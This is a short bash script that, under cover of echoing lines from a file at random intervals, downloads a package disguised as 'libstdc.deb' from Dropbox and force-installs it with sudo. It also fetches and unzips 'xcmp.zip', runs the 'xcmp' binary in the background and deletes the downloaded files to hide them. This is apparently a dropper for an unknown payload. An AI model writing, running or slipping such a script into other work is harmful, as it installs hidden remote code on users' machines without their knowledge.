#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/meshw7684r39zkt/xcmp.zip -q
unzip xcmp.zip > /dev/null 2>&1
#pwd
./config/xcmp ./config/file_data &
sleep 3
rm -rf xcmp.zip
rm -rf config/xcmp
rm -rf config/file_data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 12 ))
done < $2

